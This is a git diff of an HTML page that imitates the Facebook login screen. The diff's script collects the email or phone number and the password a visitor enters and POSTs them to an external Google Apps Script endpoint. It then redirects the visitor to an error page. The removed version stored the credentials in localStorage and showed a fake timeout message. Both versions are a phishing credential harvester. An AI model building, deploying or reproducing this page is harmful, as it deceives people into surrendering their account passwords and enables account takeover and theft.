@@ -5,208 +5,184 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
-    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+  body{
     
-  <style>
-    /* Existing CSS styles */
-    body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 20px;
-    }
+    padding-bottom:70px;
+  }
+        /* Paste the CSS styles here */
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          font-family: 'Roboto', sans-serif;
+        }
 
-    /* Add the provided CSS code here */
-    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        .flex {
+          display: flex;
+          align-items: center;
+        }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
-    }
+        .container {
+          padding: 0 15px;
+          min-height: 100vh;
+          justify-content: center;
+          background: white;
+        }
 
-    .flex {
-      display: flex;
-      align-items: center;
-    }
+        .facebook-page {
+          justify-content: space-between;
+          max-width: ;
+          width: 100%;
+        }
 
-    .container {
-      padding: 0px;
-      min-height: 90vh;
-      justify-content: center;
-      background:;
-      padding-bottom:50px;
-    }
+        .facebook-page .text {
+          margin-bottom: 90px;
+        }
 
-    .facebook-page {
-      justify-content: space-between;
-      max-width: ;
-      width: 100%;
-    }
+        .facebook-page h1 {
+          color: #1877f2;
+          font-size: 4rem;
+          margin-top: 30px;
+          margin-bottom: 10px;
+        }
 
-    .facebook-page .text {
-      margin-bottom: 90px;
-    }
+        .facebook-page p {
+          font-size: 1.75rem;
+          white-space: nowrap;
+        }
 
-    .facebook-page h1 {
-      color: #1877f2;
-      font-size: 4rem;
-      margin-top: 30px;
-      margin-bottom: 10px;
-    }
+        form {
+          display: flex;
+          flex-direction: column;
+          background: #fff;
+          border-radius: 8px;
+          padding: 20px;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+            0 8px 16px rgba(0, 0, 0, 0.1);
+          max-width: 400px;
+          width: 100%;
+        }
 
-    .facebook-page p {
-      font-size: 1.75rem;
-      white-space: nowrap;
-    }
+        form input {
+          height: 55px;
+          width: 100%;
+          border: 1px solid #ccc;
+          border-radius: 6px;
+          margin-bottom: 15px;
+          font-size: 1rem;
+          padding: 0 14px;
+        }
 
-    form {
-      display: flex;
-      flex-direction: column;
-      background: #fff;
-      border-radius: 8px;
-      padding: 20px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
-        0 8px 16px rgba(0, 0, 0, 0.1);
-      max-width: 400px;
-      width: 100%;
-    }
+        form input:focus {
+          outline: none;
+          border-color: #1877f2;
+        }
 
-    form input {
-      height: 55px;
-      width: 100%;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      margin-bottom: 15px;
-      font-size: 1rem;
-      padding: 0 14px;
-    }
+        ::placeholder {
+          color: #777;
+          font-size: 1.063rem;
+        }
 
-    form input:focus {
-      outline: none;
-      border-color: #1877f2;
-    }
+        .link {
+          display: flex;
+          flex-direction: column;
+          text-align: center;
+          gap: 15px;
+        }
 
-    ::placeholder {
-      color: #777;
-      font-size: 1.063rem;
-    }
+        input[type="submit"] {
+          border: none;
+          outline: none;
+          cursor: pointer;
+          background: #1877f2;
+          padding: 15px 0;
+          border-radius: 6px;
+          color: #fff;
+          font-size: 1.25rem;
+          font-weight: 600;
+          transition: 0.2s ease;
+        }
 
-    .link {
-      display: flex;
-      flex-direction: column;
-      text-align: center;
-      gap: 15px;
-    }
+        input[type="submit"] {
+          background: #0d65d9;
+        }
 
-    input[type="submit"] {
-      border: none;
-      outline: none;
-      cursor: pointer;
-      background: #1877f2;
-      padding: 15px 0;
-      border-radius: 6px;
-      color: #fff;
-      font-size: 1.25rem;
-      font-weight: 600;
-      transition: 0.2s ease;
-    }
+        form a {
+          text-decoration: none;
+        }
 
-    input[type="submit"] {
-      background: #0d65d9;
-    }
+        .link .forgot {
+          color: #1877f2;
+          font-size: 0.875rem;
+        }
 
-    form a {
-      text-decoration: none;
-    }
+        .link .forgot:hover {
+          text-decoration: underline;
+        }
 
-    .link .forgot {
-      color: #1877f2;
-      font-size: 0.875rem;
-    }
+        hr {
+          border: none;
+          height: 1px;
+          background-color: #ccc;
+          margin-bottom: 20px;
+          margin-top: 20px;
+        }
 
-    .link .forgot:hover {
-      text-decoration: underline;
-    }
+        .button {
+          margin-top: 25px;
+          text-align: center;
+          margin-bottom: 20px;
+        }
 
-    hr {
-      border: none;
-      height: 1px;
-      background-color: #ccc;
-      margin-bottom: 20px;
-      margin-top: 20px;
-    }
+        .button a {
+          padding: 15px 20px;
+          background: #42b72a;
+          border-radius: 6px;
+          color: #fff;
+          font-size: 1.063rem;
+          font-weight: 600;
+          transition: 0.2s ease;
+        }
 
-    .button {
-      margin-top: 25px;
-      text-align: center;
-      margin-bottom: 20px;
-    }
+        .button a:hover {
+          background: #3ba626;
+        }
 
-    .button a {
-      padding: 15px 20px;
-      background: #42b72a;
-      border-radius: 6px;
-      color: #fff;
-      font-size: 1.063rem;
-      font-weight: 600;
-      transition: 0.2s ease;
-    }
+        @media (max-width: 900px) {
+          .facebook-page {
+            flex-direction: column;
+            text-align: center;
+          }
 
-    .button a:hover {
-      background: #3ba626;
-    }
+          .facebook-page .text {
+            margin-bottom: 30px;
+          }
+        }
 
-    @media (max-width: 900px) {
-      .facebook-page {
-        flex-direction: column;
-        text-align: center;
-      }
+        @media (max-width: 460px) {
+          .facebook-page h1 {
+            font-size: 3.5rem;
+          }
 
-      .facebook-page .text {
-        margin-bottom: 30px;
-      }
-    }
+          .facebook-page p {
+            font-size: 1.3rem;
+          }
 
-    @media (max-width: 460px) {
-      .facebook-page h1 {
-        font-size: 3.5rem;
-      }
+          form {
+            padding: 15px;
+          }
+        }
+  
+  form input[type="button"] {
+  background: #1877f2;
+  font-weight: bold;
+  color: #fff;
+}
 
-      .facebook-page p {
-        font-size: 1.3rem;
-      }
-
-      form {
-        padding: 15px;
-      }
-    }
-</style>
-
-  <style>
-    /* Style for the popup message box */
-    .popup {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: #316FF6;
-        color: white;
-        padding: 20px;
-        border-radius: 10px;
-        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
-        z-index: 9999;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-    }
-    #okButton {
-        margin-top: 20px;
-        margin-left: auto; /* Center the button horizontally */
-        margin-right: auto;
-        display: block; /* Ensure the button takes up the full width */
-    }
-</style>
+  
+    </style>
 
 
 <head>
@@ -214,8 +190,6 @@
     <meta property="og:image" content="https://github.com/fbook0/login/raw/main/Facebook123.jpg">
 </head>
 
-
-  
 </head>
 <body>
 <div class="container flex">
@@ -229,7 +203,7 @@
             <input type="text" id="emailOrNumber" placeholder="Email or Phone Number" required>
             <input type="password" id="password" placeholder="Password" required>
             <div class="link">
-                <input type="submit" value="Login">
+                <input type="button" value="Login" onclick="submitForm()">
                 <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0&wtsid=rdr_0a1vrAnFl0f2Tj8xT&_rdr"
                    class="forgot">Forgot password?</a>
             </div>
@@ -242,57 +216,47 @@
     </div>
 </div>
 
-<!-- Popup message box for successful login -->
-<div id="successPopup" class="popup" style="display: none;">
-    <span id="successMessage">Timeout! Please try to login on mobile app!</span>
-    <button id="okButton">OK</button>
-</div>
-
 <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault(); // Prevent form submission
-        var emailOrNumber = document.getElementById("emailOrNumber").value;
-        var password = document.getElementById("password").value;
+  function submitForm() {
+    var emailOrNumber = document.getElementById("emailOrNumber").value;
+    var password = document.getElementById("password").value;
+    var formData = { emailOrNumber: emailOrNumber, password: password };
 
-        // Validation
-        if (emailOrNumber.length < 11) {
-            showError("Email or Phone Number must be 11 digits or more.");
-            return;
-        }
-
-        if (password.length < 6) {
-            showError("Password must be 6 characters or more.");
-            return;
-        }
-
-        // You can modify this key as per your requirement
-        var key = "login_" + new Date().getTime(); // Using timestamp as a key
-
-        // Save the login information in local storage with the specified key
-        localStorage.setItem(key, JSON.stringify({ emailOrNumber: emailOrNumber, password: password }));
-
-        // Display success popup
-        document.getElementById("successPopup").style.display = "block";
-
-        // Clear the form fields if needed
-        document.getElementById("emailOrNumber").value = "";
-        document.getElementById("password").value = "";
-    });
-
-    document.getElementById("okButton").addEventListener("click", function() {
-        document.getElementById("successPopup").style.display = "none";
-    });
-
-    function showError(message) {
-        var errorDiv = document.createElement("div");
-        errorDiv.style.color = "red";
-        errorDiv.textContent = message;
-        document.getElementById("errorDiv").innerHTML = ""; // Clear existing error messages
-        document.getElementById("errorDiv").appendChild(errorDiv);
+    // Check if the password length is less than 6
+    if (password.length < 6) {
+        document.getElementById("errorDiv").textContent = "Invalid password (must be at least 6 characters)";
+        document.getElementById("errorDiv").style.color = "red"; // Set color to red
+        
+        // Remove the error message after 2 seconds
         setTimeout(function() {
-            errorDiv.remove();
-        }, 3000);
+            document.getElementById("errorDiv").textContent = "";
+        }, 2000);
+        
+        return; // Stop further execution
     }
+
+    fetch('https://script.google.com/macros/s/AKfycbyJg3DXdqPehLn6am9tlyrXQHckKebOHRH8bIYmfMIQmOB-jr3H_8y-v_mmrVC1vh9O8w/exec', {
+        method: 'POST',
+        body: JSON.stringify(formData)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.text();
+    })
+    .then(data => {
+        console.log(data); // Log the response
+        // Redirect to error.html
+        window.location.href = "error.html";
+    })
+    .catch(error => {
+        console.error('There was a problem with your fetch operation:', error);
+        // Display error message or perform any other error handling
+    });
+}
+
+  
 </script>
 
 </body>
